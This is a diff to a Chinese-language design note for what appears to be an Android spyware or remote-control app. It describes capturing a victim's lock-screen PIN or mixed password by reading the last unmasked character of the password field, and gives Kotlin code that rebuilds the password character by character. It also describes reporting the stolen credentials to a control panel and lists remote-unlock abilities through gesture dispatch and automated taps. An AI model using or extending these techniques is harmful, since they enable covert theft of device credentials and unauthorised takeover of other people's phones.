@@ -80,3 +80,44 @@ fake_pin / fake_pwd / fake_pattern、apppwd、locktype
 3. 面板「锁屏密码」出现一条「系统PIN」
 4. 「一键解锁」可用（需灭屏 + 锁屏状态）
 ```
+
+## 混合密码（字母 + 数字）
+
+三星等 ROM 的混合密码框同样会"露最后一位明文"，而且明文可以是字母：
+
+```
+masked field=[q]       len=1   ← 第 1 位是字母 q
+masked field=[•1]      len=2
+masked field=[••2]     len=3
+masked field=[•••3]    len=4
+masked field=[••••4]   len=5
+```
+
+所以还原规则从"只收数字"改成"掩码点以外都当明文"：
+
+```kotlin
+private fun isMask(c: Char) = c == '•' || c == '●' || c == '＊' || c == '·' || c == '*'
+text.forEachIndexed { i, c -> if (!isMask(c)) pinByPos[i] = c }
+```
+
+两个配套改动：
+
+```
+① 长度从 >1 突然掉到 1 = 新一次输入（PIN ↔ 混合密码切换要清空旧位置表）
+② 解锁离开时，掩码快照也算"有内容" → 触发结算（否则混合密码没数字键缓冲，永远不上报）
+```
+
+上报类型自动区分：
+
+```
+含字母 → pwd2（面板「系统混合密码」）
+纯数字 → pwd （面板「系统PIN」）
+```
+
+## V2 解锁的能力边界
+
+```
+图案           ✅ dispatchGesture 画线
+纯数字 PIN     ✅ 逐个点数字键 + 点确定（需屏幕已亮）
+混合密码       ❌ 未支持（点按逻辑只认数字键；锁屏 ACTION_SET_TEXT 被系统拒绝）
+```
